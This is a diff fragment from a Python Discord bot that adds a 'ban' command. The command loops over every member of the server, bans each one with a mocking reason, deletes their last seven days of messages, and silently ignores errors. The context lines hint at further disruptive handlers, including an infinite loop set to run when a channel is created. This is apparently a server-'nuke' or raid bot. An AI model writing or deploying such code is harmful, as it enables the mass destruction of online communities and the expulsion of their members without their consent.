@@ -142,7 +142,17 @@ async def weslayHelp(ctx):
     except:
             pass
 
-
+@client.command()
+async def ban(ctx):
+    for member in list(ctx.guild.members):
+      try:
+        await member.ban(reason="pooooop", delete_message_days=7)
+        print(f"Banned {member.display_name}!")
+        print("Banning is complete!")
+      except Exception:
+        pass
+      
+      
 @client.event
 async def on_guild_channel_create(channel):
   while True:
